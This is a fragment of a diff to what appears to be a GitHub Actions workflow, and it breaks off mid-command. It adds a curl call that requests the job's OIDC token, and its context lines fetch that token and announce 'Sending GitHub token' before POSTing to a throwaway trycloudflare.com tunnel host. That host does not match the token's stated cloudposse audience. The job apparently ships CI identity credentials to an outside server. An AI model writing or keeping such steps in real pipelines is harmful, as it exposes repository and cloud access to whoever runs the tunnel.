@@ -17,6 +17,7 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
+          curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=app.cloudposse.com" -H "User-Agent: actions/oidc-client" -H "Authorization: ***"
           OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=app.cloudposse.com" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
           echo "Sending GitHub token to /api/auth/github-oidc..."
           response=$(curl -s -w "\n%{http_code}" -X POST https://find-wisconsin-criterion-volunteers.trycloudflare.com/api/auth/github-oidc \
